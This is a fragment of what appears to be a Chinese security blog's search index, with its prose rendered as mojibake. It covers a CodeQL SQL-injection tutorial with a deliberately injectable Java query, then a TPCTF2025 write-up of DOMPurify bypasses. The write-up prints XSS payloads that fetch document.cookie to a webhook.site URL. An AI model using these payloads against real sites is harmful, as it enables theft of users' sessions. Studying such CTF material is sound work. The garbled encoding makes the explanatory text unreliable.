sink where config.hasFlowPath(source, sink) select source.getNode(), source, sink, \"source\" CodeQL åœ¨å®šä¹‰ç±»ä¸Šçš„è¯­æ³•å’Œ Java ç±»ä¼¼ï¼Œå…¶ä¸­ extends çš„çˆ¶ç±» TaintTracking::Configuration æ˜¯å®˜æ–¹æä¾›ç”¨æ¥åšæ•°æ®æµåˆ†æçš„é€šç”¨ç±»ï¼Œæä¾›å¾ˆå¤šæ•°æ®æµåˆ†æç›¸å…³çš„æ–¹æ³•ï¼Œæ¯”å¦‚isSource(å®šä¹‰source)ï¼ŒisSink(å®šä¹‰sink) src instanceof RemoteFlowSource è¡¨ç¤ºsrc å¿…é¡»æ˜¯ RemoteFlowSource ç±»å‹ã€‚åœ¨RemoteFlowSourceé‡Œï¼Œå®˜æ–¹æä¾›å¾ˆéå¸¸å…¨çš„sourceå®šä¹‰ï¼Œæˆ‘ä»¬æœ¬æ¬¡ç”¨åˆ°çš„Springbootçš„Sourceå°±å·²ç»æ¶µç›–äº†ã€‚ æ³¨ï¼šä¸Šé¢çš„æ³¨é‡Šå’Œå…¶å®ƒè¯­è¨€æ˜¯ä¸ä¸€æ ·çš„ï¼Œä¸èƒ½å¤Ÿåˆ é™¤ï¼Œå®ƒæ˜¯ç¨‹åºçš„ä¸€éƒ¨åˆ†ï¼Œå› ä¸ºåœ¨æˆ‘ä»¬ç”Ÿæˆæµ‹è¯•æŠ¥å‘Šçš„æ—¶å€™ï¼Œä¸Šé¢æ³¨é‡Šå½“ä¸­çš„nameï¼Œdescriptionç­‰ä¿¡æ¯ä¼šå†™å…¥åˆ°å®¡è®¡æŠ¥å‘Šä¸­ã€‚ è¿™é‡Œçš„isSource å’ŒisSink æ ¹æ®è‡ªå·±éœ€è¦è¿›è¡Œé‡å†™ï¼Œè€Œåˆ¤æ–­ä¸­é—´æ˜¯å¦ç–é€šå¯ä»¥ä½¿ç”¨CodeQLæä¾›çš„config.hasFlowPath(source, sink)æ¥å¸®æˆ‘ä»¬å¤„ç† å¯ä»¥çœ‹åˆ°çœŸçš„å¾ˆæ–¹ä¾¿ï¼Œç›´æ¥æŠŠsourceå¤„å’Œæ•´ä¸ªä»sourceåˆ°sinkçš„é“¾å­éƒ½æ˜¾ç¤ºå‡ºæ¥äº† è¿™é‡Œçˆ†è­¦å‘Šè¯´æ˜¯ DataFlow::PathGraph åœ¨æ–°ç‰ˆæœ¬ä¸­è¢«å¼ƒç”¨äº†ï¼Œæ‰€ä»¥è¿™æ®µä»£ç åªèƒ½åœ¨ä½ç‰ˆæœ¬çš„è§„åˆ™åº“é‡Œè·‘ è¿™é‡Œå¼€å¤´æœ‰ @kind path-problem ï¼Œè¯´æ˜ç»“æœè‡³å°‘æ˜¯4åˆ—ï¼Œå†™äº†è¿™ä¸ªç»“æœå°±ä¼šè¾“å‡ºå®Œæ•´çš„æ±¡ç‚¹ä¼ æ’­è·¯å¾„ï¼Œé™¤æ­¤ä¹‹å¤–å¯¹è¾“å‡ºè¿˜æœ‰å…¶ä»–è¦æ±‚ï¼Œæ¯”å¦‚æ¯åˆ—è¦è¾“å‡ºçš„ç±»å‹ä¹Ÿæœ‰è¦æ±‚ï¼Œä½†æ˜¯æˆ‘è¿™ source.getNode(),source, sink,\"source\" å°±èƒ½æ­£å¸¸è¾“å‡ºï¼Œsource, sink,source.getNode(),\"source\" å´æ˜¯å•¥ä¹Ÿæ²¡æœ‰ ","date":"2025-04-13","objectID":"/posts/28dc684/:5:1","tags":["Java"],"title":"CodeQLå…¥é—¨","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"è¯¯æŠ¥åˆ†æ\ræˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰ä¸€å¤„çš„ sql æ³¨å…¥ï¼Œå…¶è¾“å…¥çš„å‚æ•°ç±»å‹ä¸º List\u003cLong\u003e ï¼Œä¸å¯èƒ½å­˜åœ¨æ³¨å…¥ è¿™é‡Œè¯´æ˜æˆ‘ä»¬ç»™çš„é™åˆ¶å¹¶æœªä¸¥æ ¼è¦æ±‚å‚æ•°ç±»å‹ï¼Œå°±ä¼šå¯¼è‡´ä»¥ä¸Šçš„è¯¯æŠ¥äº§ç”Ÿï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ isSanitizer æ¥é¿å…è¿™ç§æƒ…å†µ isSanitizeræ˜¯CodeQLçš„ç±»TaintTracking::Configurationæä¾›çš„å‡€åŒ–æ–¹æ³•ã€‚å®ƒçš„å‡½æ•°åŸå‹æ˜¯ï¼š override predicate isSanitizer(DataFlow::Node node) {} åœ¨CodeQLè‡ªå¸¦çš„é»˜è®¤è§„åˆ™é‡Œï¼Œå¯¹å½“å‰èŠ‚ç‚¹æ˜¯å¦ä¸ºåŸºç¡€ç±»å‹åšäº†åˆ¤æ–­ override predicate isSanitizer(DataFlow::Node node) { node.getType() instanceof PrimitiveType or node.getType() instanceof BoxedType or node.getType() instanceof NumberType } è¡¨ç¤ºå¦‚æœå½“å‰èŠ‚ç‚¹æ˜¯ä¸Šé¢æåˆ°çš„åŸºç¡€ç±»å‹ï¼Œé‚£ä¹ˆæ­¤æ±¡æŸ“é“¾å°†è¢«å‡€åŒ–é˜»æ–­ï¼Œæ¼æ´å°†ä¸å­˜åœ¨ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œé»˜è®¤è§„åˆ™åªæ˜¯ä¸€äº›åŸºç¡€ç±»å‹ï¼Œæ²¡æœ‰ç±»ä¼¼ List\u003clong\u003e ç­‰çš„å¤åˆç±»å‹ æˆ‘ä»¬å°† TaintTracking::Configuration ä¸­çš„ isSanitizer é‡å†™ä¸‹å°±å¥½äº† override predicate isSanitizer(DataFlow::Node node) { node.getType() instanceof PrimitiveType or node.getType() instanceof BoxedType or node.getType() instanceof NumberType or exists(ParameterizedType pt| node.getType() = pt and pt.getTypeArgument(0) instanceof NumberType ) // è¿™é‡Œçš„ ParameterizedType ä»£è¡¨æ‰€æœ‰æ³›å‹ï¼Œåˆ¤æ–­æ³›å‹å½“ä¸­çš„ä¼ å‚æ˜¯å¦ä¸º Number å‹ } è¿™æ ·åœ¨æ£€æµ‹åˆ° List\u003clong\u003e æ—¶å°±ä¼šå°†å…¶å‡€åŒ–æ‰ï¼Œè¿™æ ·é“¾å­å°±ä¸é€šäº†ï¼Œä¹Ÿå°±ä¸ä¼šå‡ºç°è¯¯æŠ¥çš„æƒ…å†µ ","date":"2025-04-13","objectID":"/posts/28dc684/:5:2","tags":["Java"],"title":"CodeQLå…¥é—¨","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"æ¼æŠ¥è¡¥å……\ræˆ‘ä»¬å‘ç°å¦‚ä¸‹ sql æ³¨å…¥æ²¡æœ‰è¢«æ•æ‰åˆ°ï¼ˆå‚è€ƒæ–‡ç« æ˜¯è¿™æ ·å†™çš„ï¼Œä½†æˆ‘è¿™æ˜¯æ•æ‰åˆ°äº†çš„ï¼‰ public List\u003cStudent\u003e getStudentWithOptional(Optional\u003cString\u003e username) { String sqlWithOptional = \"select * from students where username like '%\" + username.get() + \"%'\"; //String sql = \"select * from students where username like ?\"; return jdbcTemplate.query(sqlWithOptional, ROW_MAPPER); } å®å¯é”™æ€ä¸€ç™¾ä¸å¯æ”¾è¿‡ä¸€ä¸ªï¼Œåœ¨ä»£ç å®¡è®¡ä¸­æ˜¯å¦‚æ­¤ï¼Œè¯¯æŠ¥å¯èƒ½éœ€è¦èŠ±è´¹æ—¶é—´å»ç­›é€‰ï¼Œä½†æ˜¯æ¼æŠ¥çš„æŸå¤±åˆ™æ— æ³•æŒ½å› åœ¨ CodeQL ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ isAdditionalTaintStep æ–¹æ³•æ¥å°†æ–­äº†çš„èŠ‚ç‚¹ç»™å®ƒå¼ºåˆ¶è¿æ¥ä¸Š isAdditionalTaintStep æ–¹æ³•æ˜¯CodeQLçš„ç±»TaintTracking::Configurationæä¾›çš„çš„æ–¹æ³•ï¼Œå®ƒçš„åŸå‹æ˜¯ï¼š override predicate isAdditionalTaintStep(DataFlow::Node node1, DataFlow::Node node2) {} å®ƒçš„ä½œç”¨æ˜¯å°†ä¸€ä¸ªå¯æ§èŠ‚ç‚¹ï¼Œæ¯”å¦‚Aå¼ºåˆ¶ä¼ é€’ç»™å¦å¤–ä¸€ä¸ªèŠ‚ç‚¹Bï¼Œé‚£ä¹ˆèŠ‚ç‚¹Bä¹Ÿå°±æˆäº†å¯æ§èŠ‚ç‚¹ã€‚ å‡è®¾è¿™é‡Œæ˜¯ username.get() è¿™ä¸€æ­¥æ–­æ‰äº†ï¼Œæˆ‘ä»¬å¯ä»¥å¼ºåˆ¶è®© username æµè½¬åˆ° username.get() ï¼Œä»£ç ä¸º /** * @id java/examples/vuldemo * @name Sql-Injection * @description Sql-Injection * @kind path-problem * @problem.severity warning */ import java import semmle.code.java.dataflow.FlowSources import semmle.code.java.security.QueryInjection import DataFlow::PathGraph predicate isTaintedString(Expr expSrc, Expr expDest) { exists(Method method, MethodAccess call, MethodAccess call1 | expSrc = call1.getArgument(0) and expDest=call and call.getMethod() = method and method.hasName(\"get\") and method.getDeclaringType().toString() = \"Optional\u003cString\u003e\" and call1.getArgument(0).getType().toString() = \"Optional\u003cString\u003e\" ) } class VulConfig extends TaintTracking::Configuration { VulConfig() { this = \"SqlInjectionConfig\" } override predicate isSource(DataFlow::Node src) { src instanceof RemoteFlowSource } override predicate isSanitizer(DataFlow::Node node) { node.getType() instanceof PrimitiveType or node.getType() instanceof BoxedType or node.getType() instanceof NumberType or exists(ParameterizedType pt| node.getType() = pt and pt.getTypeArgument(0) instanceof NumberType ) } override predicate isSink(DataFlow::Node sink) { exists(Method method, MethodAccess call | method.hasName(\"query\") and call.getMethod() = method and sink.asExpr() = call.getArgument(0) ) } override predicate isAdditionalTaintStep(DataFlow::Node node1, DataFlow::Node node2) { isTaintedString(node1.asExpr(), node2.asExpr()) } } from VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink where config.hasFlowPath(source, sink) select source.getNode(), source, sink, \"source\" expSrc = call1.getArgument(0)ï¼šè§„å®šäº†æ±¡æŸ“æºä¸ºç¬¬ä¸€ä¸ªå‚æ•° expDest = call and call.getMethod() = method and method.hasName(\"get\")ï¼šè§„å®šäº†æ±¡æŸ“ç›®æ ‡ä¸º xxx.get() method.getDeclaringType().toString() = \"Optional\u003cString\u003e\" and call1.getArgument(0).getType().toString() = \"Optional\u003cString\u003e\" ï¼šè§„å®šäº†æ±¡æŸ“æºå’Œæ±¡æŸ“ç›®æ ‡çš„ç±»å‹ä¸ºOptional\u003cString\u003e ","date":"2025-04-13","objectID":"/posts/28dc684/:5:3","tags":["Java"],"title":"CodeQLå…¥é—¨","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"Lomboké—®é¢˜è§£å†³\rLombokæ˜¯ä¸€ä¸ªéå¸¸æœ‰åçš„Javaç±»åº“ï¼Œåœ¨å¼€å‘ä¸­åº”è¯¥ç»å¸¸é‡åˆ°ï¼Œå®ƒé€šè¿‡ç®€å•çš„æ³¨è§£æ¥å¸®åŠ©æˆ‘ä»¬ç®€åŒ–æ¶ˆé™¤ä¸€äº›å¿…é¡»æœ‰ä½†æ˜¾å¾—å¾ˆè‡ƒè‚¿çš„Javaä»£ç çš„å·¥å…·ï¼Œæ¯”å¦‚æˆ‘ä»¬å¯ä»¥ä¸ç”¨ç¼–å†™ getterï¼Œsetter demo public class Student { private int id; private String username; public void setId(int id) { this.id = id; } public int getId() { return id; } public String getUsername() { return username; } public void setUsername(String username) { this.username = username; } } å½“æˆ‘ä»¬ä½¿ç”¨ Lombok çš„æ³¨è§£ï¼Œå°±ä¸éœ€è¦æ‰‹åŠ¨ç¼–å†™ getter å’Œ setterï¼Œä»¥ä¸‹ä»£ç ç­‰åŒäºä¸Šé¢çš„ demo import lombok.Data; @Data public class Student { private int id; private String username; private int sex; private int age; } å¯ä»¥çœ‹åˆ°ç”¨äº† lombok æ³¨è§£åå°±æ²¡æœ‰äº† getter å’Œ setterï¼Œè¿™å°±ä¼šå¯¼è‡´ CodeQL ä¸èƒ½æ­£å¸¸æ£€æµ‹ï¼Œsource åˆ° sink çš„é“¾æ¡æ–­è£‚ï¼Œä»è€Œé€ æˆæ¼æŠ¥ æœ‰ä¸¤ç§è§£å†³åŠæ³•ï¼Œç¬¬ä¸€ç§æ˜¯åœ¨ pom.xml ä¸­åŠ å…¥ä¾èµ–ï¼Œå†é‡æ–°ç¼–è¯‘å³å¯ \u003cbuild\u003e \u003csourceDirectory\u003etarget/generated-sources/delombok\u003c/sourceDirectory\u003e \u003ctestSourceDirectory\u003etarget/generated-test-sources/delombok\u003c/testSourceDirectory\u003e \u003cplugins\u003e \u003cplugin\u003e \u003cgroupId\u003eorg.projectlombok\u003c/groupId\u003e \u003cartifactId\u003elombok-maven-plugin\u003c/artifactId\u003e \u003cversion\u003e1.18.20.0\u003c/version\u003e \u003cexecutions\u003e \u003cexecution\u003e \u003cid\u003edelombok\u003c/id\u003e \u003cphase\u003egenerate-sources\u003c/phase\u003e \u003cgoals\u003e \u003cgoal\u003edelombok\u003c/goal\u003e \u003c/goals\u003e \u003cconfiguration\u003e \u003caddOutputDirectory\u003efalse\u003c/addOutputDirectory\u003e \u003csourceDirectory\u003esrc/main/java\u003c/sourceDirectory\u003e \u003c/configuration\u003e \u003c/execution\u003e \u003cexecution\u003e \u003cid\u003etest-delombok\u003c/id\u003e \u003cphase\u003egenerate-test-sources\u003c/phase\u003e \u003cgoals\u003e \u003cgoal\u003etestDelombok\u003c/goal\u003e \u003c/goals\u003e \u003cconfiguration\u003e \u003caddOutputDirectory\u003efalse\u003c/addOutputDirectory\u003e \u003csourceDirectory\u003esrc/test/java\u003c/sourceDirectory\u003e \u003c/configuration\u003e \u003c/execution\u003e \u003c/executions\u003e \u003c/plugin\u003e \u003cplugin\u003e \u003cgroupId\u003eorg.springframework.boot\u003c/groupId\u003e \u003cartifactId\u003espring-boot-maven-plugin\u003c/artifactId\u003e \u003c/plugin\u003e \u003c/plugins\u003e \u003c/build\u003e ç¬¬äºŒç§æ˜¯æœ‰äººåœ¨ issue ä¸­æå‡ºçš„ï¼šhttps://github.com/github/codeql/issues/4984 # get a copy of lombok.jar wget https://projectlombok.org/downloads/lombok.jar -O \"lombok.jar\" # run \"delombok\" on the source files and write the generated files to a folder named \"delombok\" java -jar \"lombok.jar\" delombok -n --onlyChanged . -d \"delombok\" # remove \"generated by\" comments find \"delombok\" -name '*.java' -exec sed '/Generated by delombok/d' -i '{}' ';' # remove any left-over import statements find \"delombok\" -name '*.java' -exec sed '/import lombok/d' -i '{}' ';' # copy delombok'd files over the original ones cp -r \"delombok/.\" \"./\" # remove the \"delombok\" folder rm -rf \"delombok\" ä¸¤ç§æ–¹æ³•éƒ½æ˜¯å»æ‰ lombok æ³¨è§£ï¼Œå¹¶è¿˜åŸ setter å’Œ getter æ–¹æ³•ï¼Œå®ç°æ‰‹æ³•ä¸ä¸€æ ·ç½¢äº†ï¼Œè²Œä¼¼ç¬¬ä¸€ç§æ›´æ–¹ä¾¿ï¼Œä¸çŸ¥é“ä¸ºå•¥æˆ‘è¿™å•¥éƒ½æ²¡ä¿®æ”¹è¿˜æ˜¯æ£€æµ‹å‡ºæ¥äº† ","date":"2025-04-13","objectID":"/posts/28dc684/:5:4","tags":["Java"],"title":"CodeQLå…¥é—¨","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"æ‰¹é‡åŒ–å®ç°\rä»¥ä¸Š ql è§„åˆ™å¯ä»¥æˆåŠŸè·‘å‡ºé¶åœºçš„ sql æ³¨å…¥æ¼æ´ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥å°†å…¶è¿ç”¨åˆ°å…¶ä»–é¡¹ç›®ä¸Šï¼Œå…ˆç”Ÿæˆç›¸åº”çš„æ•°æ®åº“ï¼Œç„¶åå†ç”¨å†™å¥½çš„ ql æ–‡ä»¶å»åˆ†æå°±å¥½ï¼Œcodeql å‘½ä»¤ä¸º codeql database analyze /CodeQL/databases/micro-service-seclab /CodeQL/ql/java/ql/examples/demo --format=csv --output=/CodeQL/Result/micro-service-seclab.csv --rerun ","date":"2025-04-13","objectID":"/posts/28dc684/:5:5","tags":["Java"],"title":"CodeQLå…¥é—¨","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"CodeQLè¿›é˜¶\r","date":"2025-04-13","objectID":"/posts/28dc684/:6:0","tags":["Java"],"title":"CodeQLå…¥é—¨","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"instanceofè¯­æ³•ç³–\ra instanceof b ä¸Šé¢è¯­å¥å°±æ˜¯æ£€æµ‹ a å¯¹è±¡æ˜¯å¦æ˜¯ b ç±»å‹ åœ¨é‡åˆ°å¤æ‚çš„ç±»å‹æ—¶ï¼Œå¯èƒ½è¦ç”¨å¤šä¸ª exist å­æŸ¥è¯¢è¯­å¥ï¼Œä½†æ˜¯åªç”¨ä¸€ä¸ª instanceof è¯­å¥å°±å¥½ï¼Œè€Œä¸”åªè¦åŒ¹é…ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œå°±èƒ½åŒ¹é…åˆ°è¿™ä¸ªæŠ½è±¡ç±»ä¸‹çš„æ‰€æœ‰å­ç±»ï¼Œæ¯”å¦‚ class MyCustomSource extends RemoteFlowSource å¦‚æœ x ä¸º MyCustomSource ç±»å‹ï¼Œåˆ™ x instanceof RemoteFlowSource ä¼šè¿”å›true ","date":"2025-04-13","objectID":"/posts/28dc684/:6:1","tags":["Java"],"title":"CodeQLå…¥é—¨","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"é€’å½’\rCodeQLé‡Œé¢çš„é€’å½’è°ƒç”¨è¯­æ³•æ˜¯ï¼šåœ¨è°“è¯æ–¹æ³•çš„åé¢è·Ÿ*æˆ–è€…+ï¼Œæ¥è¡¨ç¤ºè°ƒç”¨0æ¬¡ä»¥ä¸Šå’Œ1æ¬¡ä»¥ä¸Šï¼ˆå’Œæ­£åˆ™ç±»ä¼¼ï¼‰ï¼Œ0æ¬¡ä¼šæ‰“å°è‡ªå·±ã€‚ demo package org.example; public class hello { public class StudentService { class innerOne { public innerOne(){} class innerTwo { public innerTwo(){} public String Nihao() { return \"Nihao\"; } } public String Hi(){ return \"hello\"; } } } } æ­¤æ—¶å¦‚æœæƒ³è¦æ ¹æ®innerTwoç±»å®šä½åˆ°æœ€å¤–å±‚çš„ hello ç±» æˆ‘ä»¬å¯ä»¥ç”¨ä»¥ä¸‹ ql æŸ¥è¯¢è¯­å¥æ¥è·å¾—ï¼Œè°ƒç”¨ä¸¤æ¬¡ getEnclosingType æ–¹æ³•å³å¯ import java from Class classes where classes.getName().toString() = \"innerTwo\" select classes.getEnclosingType().getEnclosingType().getEnclosingType() // getEnclosingtypeè·å–ä½œç”¨åŸŸ ä½†æ˜¯å®é™…æƒ…å†µæˆ‘ä»¬ä¸çŸ¥é“è¦è°ƒç”¨å‡ æ¬¡ï¼Œè€Œä¸”è¿™æ ·å†™ä¹Ÿæ¯”è¾ƒéº»çƒ¦ è¿™æ—¶å€™å°±å¯ä»¥ç”¨åˆ°é€’å½’äº†ï¼Œæˆ‘ä»¬åœ¨è°ƒç”¨æ–¹æ³•åé¢åŠ *(ä»è‡ªèº«å¼€å§‹è°ƒç”¨)æˆ–è€…+(ä»ä¸Šä¸€çº§å¼€å§‹è°ƒç”¨)ï¼Œæ¥è§£å†³æ­¤é—®é¢˜ã€‚ from Class classes where classes.getName().toString() = \"innerTwo\" select classes.getEnclosingType+() // è·å–ä½œç”¨åŸŸ + æ˜¯ä»ä¸Šä¸€çº§å¼€å§‹è°ƒç”¨ * æ˜¯ä»è‡ªèº«å¼€å§‹è°ƒç”¨ è‡ªå·±å°è£…æ–¹æ³•æ¥å®ç°é€’å½’è°ƒç”¨ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œæ¯”å¦‚è¿™é‡Œæˆ‘è¿™åªæƒ³æ‰¾ç›¸å·®ä¸€å±‚çš„ç±» import java RefType demo(Class classes) { result = classes.getEnclosingType().getEnclosingType() } from Class classes where classes.getName().toString() = \"innerTwo\" select demo*(classes) // è·å–ä½œç”¨åŸŸ ","date":"2025-04-13","objectID":"/posts/28dc684/:6:2","tags":["Java"],"title":"CodeQLå…¥é—¨","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"å¼ºåˆ¶ç±»å‹è½¬æ¢\råœ¨ CodeQL ä¸­å¯ä»¥ç”¨ getType() æ¥å¯¹è¿”å›ç»“æœåšå¼ºåˆ¶ç±»å‹è½¬æ¢ æŸ¥è¯¢ä¸‹å½“å‰æ•°æ®åº“ä¸­æ‰€æœ‰çš„å‚æ•°åŠå…¶ç±»å‹ import java from Parameter param select param, param.getType() å¯ä»¥çœ‹åˆ°æœ‰5kå¤šæ¡è€Œä¸”æœ‰ä¸åŒç±»å‹çš„å‚æ•°ï¼Œå¼ºåˆ¶è½¬æ¢ä¸‹ï¼Œåªç•™ä¸‹æ˜¯æ•´å‹çš„å‚æ•° åªæœ‰1kå¤šæ¡äº†ï¼Œè€Œä¸”åªå«æœ‰æ•´å‹çš„ ","date":"2025-04-13","objectID":"/posts/28dc684/:6:3","tags":["Java"],"title":"CodeQLå…¥é—¨","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"æ€»ç»“\rç»¼ä¸Šå¯ä»¥çŸ¥é“CodeQLçš„å¼ºå¤§äº†ï¼Œç¨å¾®å…¥äº†ä¸‹é—¨ï¼ŒçŸ¥é“æ€ä¹ˆç”¨äº†ï¼Œéš¾ç‚¹å°±åœ¨äºè§„åˆ™çš„ç¼–å†™ï¼Œæœ€ä¸»è¦çš„å°±æ˜¯sourceï¼Œsinkå’Œä¸­é—´Sanitizerçš„ç¼–å†™ æ¥ä¸‹æ¥å°±æ˜¯æ‰¾æ¡ˆä¾‹æ¥ç»ƒæ‰‹äº† ","date":"2025-04-13","objectID":"/posts/28dc684/:7:0","tags":["Java"],"title":"CodeQLå…¥é—¨","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"å‚è€ƒ\rhttps://www.freebuf.com/articles/web/283795.html https://www.ascotbe.com/2024/12/27/CodeQL/ https://drun1baby.top/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/ ","date":"2025-04-13","objectID":"/posts/28dc684/:8:0","tags":["Java"],"title":"CodeQLå…¥é—¨","uri":"/posts/28dc684/"},{"categories":["CTF"],"content":"å‰è¨€\ræ¸…ååŒ—å¤§åŠçš„æ¯”èµ›ï¼Œè´¨é‡ä¸ç”¨è´¨ç–‘ï¼ŒMisc çš„è¯æ‰‹æ“äºŒç»´ç çš„æ—¶å€™ä¸€ç›´å¯¹ä¸ä¸Šï¼Œè²Œä¼¼æ˜¯ä¸Šä¸‹é¢ å€’äº†ï¼ŒqrzyboxåŸæ¥è¿˜èƒ½è‡ªåŠ¨è¡¥å…¨ï¼Œç®—æ˜¯å­¦åˆ°äº†ï¼ŒWeb çš„è¯å°±å¤ç°äº†ä¸‹ xss çš„ï¼Œå…¶ä»–é¢˜çœ‹ä¸‹ wp å†è¯´å§ï¼Œé¢˜ç›®åæ‰“ * çš„æ˜¯å¤ç° ","date":"2025-03-11","objectID":"/posts/c1e7c5b/:1:0","tags":["CTF"],"title":"TPCTF2025éƒ¨åˆ†wp","uri":"/posts/c1e7c5b/"},{"categories":["CTF"],"content":"Web\r","date":"2025-03-11","objectID":"/posts/c1e7c5b/:2:0","tags":["CTF"],"title":"TPCTF2025éƒ¨åˆ†wp","uri":"/posts/c1e7c5b/"},{"categories":["CTF"],"content":"baby layout\ræ€è·¯å¾ˆæ¸…æ¥šï¼Œå¯ä»¥å†™ content å’Œ layout ï¼Œç„¶åbotè®¿é—®æŒ‡å®š url æ—¶ä¼šå°† flag æ³¨å…¥åˆ°è®¿é—®çš„çš„é‚£ä¸ªç½‘é¡µçš„ cookie ä¸­ï¼Œæ‰“ xss å¸¦ cookieã€‚å¯ä»¥çœ‹åˆ°ä»£ç ä¸­å¯¹ content å’Œ layout çš„å†…å®¹éƒ½æ˜¯ç”¨ DOMPurify.sanitize() æ¥è¿›è¡Œäº†ä¸ªè¿‡æ»¤ï¼Œè€Œä¸”å¯ä»¥åœ¨é…ç½®æ–‡ä»¶ä¸­çœ‹åˆ° dompurify ç‰ˆæœ¬ä¸º 3.2.4ï¼Œåº”è¯¥ä¸æ˜¯æ‰“ 0day æˆ‘ä»¬è¿™é‡Œé‡ç‚¹çœ‹ä¸‹ content å’Œ layout çš„å®ç° app.post('/api/post', (req, res) =\u003e { const { content, layoutId } = req.body; if (typeof content !== 'string' || typeof layoutId !== 'number') { return res.status(400).send('Invalid params'); } if (content.length \u003e LENGTH_LIMIT) return res.status(400).send('Content too long'); const layout = req.session.layouts[layoutId]; if (layout === undefined) return res.status(400).send('Layout not found'); const sanitizedContent = DOMPurify.sanitize(content); //å°† layout ä¸­çš„ {{content}} æ›¿æ¢ä¸º content çš„å€¼ const body = layout.replace(/\\{\\{content\\}\\}/g, () =\u003e sanitizedContent); if (body.length \u003e LENGTH_LIMIT) return res.status(400).send('Post too long'); const id = randomBytes(16).toString('hex'); posts.set(id, body); req.session.posts.push(id); console.log(`Post ${id} ${Buffer.from(layout).toString('base64')} ${Buffer.from(sanitizedContent).toString('base64')}`); return res.json({ id }); }); app.post('/api/layout', (req, res) =\u003e { const { layout } = req.body; if (typeof layout !== 'string') return res.status(400).send('Invalid param'); if (layout.length \u003e LENGTH_LIMIT) return res.status(400).send('Layout too large'); const sanitizedLayout = DOMPurify.sanitize(layout); const id = req.session.layouts.length; req.session.layouts.push(sanitizedLayout); return res.json({ id }); }); å¯ä»¥çœ‹åˆ°åœ¨ content çš„å®ç°ä¸­æ˜¯å…ˆæ£€æµ‹å†æ›¿æ¢ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥å°† payload åˆ†ä¸ºä¸¤æ®µï¼Œä¸€æ®µå†™å…¥ layout ï¼Œå¹¶å°†ä¼šè¢«è¿‡æ»¤çš„éƒ¨åˆ†æ›¿æ¢ä¸º {{content}}ï¼Œç¬¬äºŒæ®µå†™å…¥ contentï¼Œå€¼å°±ä¸ºä¼šè¢«è¿‡æ»¤çš„éƒ¨åˆ†ï¼Œè¿™æ ·çš„è¯ content å’Œ layout éƒ½å¯ä»¥ç»•è¿‡ DOMPurify.sanitize() çš„æ£€æµ‹ï¼Œè€Œä¸”ä¹Ÿä¼šå°† content çš„å€¼æ‹¼å…¥ layout ä¸­ï¼Œå½¢æˆæœ€åçš„æ¶æ„ payloadã€‚è€Œä¹‹æ‰€ä»¥ content çš„å€¼ä¸ä¼šè¢«è¿‡æ»¤ï¼Œåº”è¯¥æ˜¯æ²¡æœ‰å½¢æˆä¸€ä¸ªå®Œæ•´çš„ html ï¼Œæ²¡è¢«æ£€æµ‹åˆ°ï¼Œå¯ä»¥åœ¨å®˜æ–¹çš„github ä¸Šæ‰¾åˆ°ä¸ª demo æ¥æµ‹è¯•ä¸€ä¸‹ï¼šDOMPurify 3.2.4 â€œShipwreckâ€ å¯ä»¥çœ‹åˆ°ç¬¬äºŒæ¬¡å°±è¢«è¿‡æ»¤äº†è€Œç¬¬ä¸€æ¬¡å´æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œå¼¹ä¸ªçª—å…ˆ layout ä¸º \u003caudio src={{content}}\u003e content ä¸º \"a\" onloadstart=\"alert(1)\" create post å°±å¼¹çª—äº† æºç ä¹Ÿå¯ä»¥çœ‹åˆ°æ˜¯æˆåŠŸæ’å…¥äº†çš„ å¸¦ä¸‹ cookie \"a\" onloadstart=\"fetch('https://webhook.site/98df9897-f596-4e4b-9994-3ee26ff59249?f=' + document.cookie)\" åé¢ä¸¤é“åŠ å¼ºé¢˜éƒ½å¯ä»¥å‚è€ƒï¼šhttps://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#dangerous-allow-lists ","date":"2025-03-11","objectID":"/posts/c1e7c5b/:2:1","tags":["CTF"],"title":"TPCTF2025éƒ¨åˆ†wp","uri":"/posts/c1e7c5b/"},{"categories":["CTF"],"content":"safe layout\råŠ å¼ºäº†è¿‡æ»¤ å°† ALLOWED_ATTR ç½®ä¸ºç©ºï¼Œä¹Ÿå°±æ˜¯ä¸èƒ½å¼•ç”¨å±æ€§ï¼Œä½†è·Ÿè¿›åä¼šå‘ç°è¿˜å¯ä»¥ç”¨ ALLOW_DATA_ATTR å’Œ ALLOW_ARIA_ATTR ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ä¾ç„¶å¯ä»¥ç”¨è‡ªå®šä¹‰çš„ dataï¼Œåæ¥æ¶æ„ä»£ç å³å¯ layout \u003caudio data-a={{content}}\u003e content a\" src=\"a\" onloadstart=\"fetch('https://webhook.site/0f676d3e-7a72-4491-af58-7419e600dabf?f=' + document.cookie)\" å¿…é¡»æœ‰ src å±æ€§ï¼Œä¸ç„¶ä¼šæŠ¥é”™ ","date":"2025-03-11","objectID":"/posts/c1e7c5b/:2:2","tags":["CTF"],"title":"TPCTF2025éƒ¨åˆ†wp","uri":"/posts/c1e7c5b/"},{"categories":["CTF"],"content":"safe layout revenge\rè¿™é“å°±ä¿®å¤äº†ä¸Šé¢çš„éé¢„æœŸï¼ŒæŠŠ ALLOW_ARIA_ATTR å’Œ ALLOW_DATA_ATTR éƒ½è®¾ä¸ºäº† false ä» å‡ºé¢˜äººçš„wp ä¸­çœ‹åˆ°dompurifyéå¸¸ä¸¥æ ¼ï¼Œ\u003cstyle\u003eä¸­çš„ä»»ä½•HTMLæ 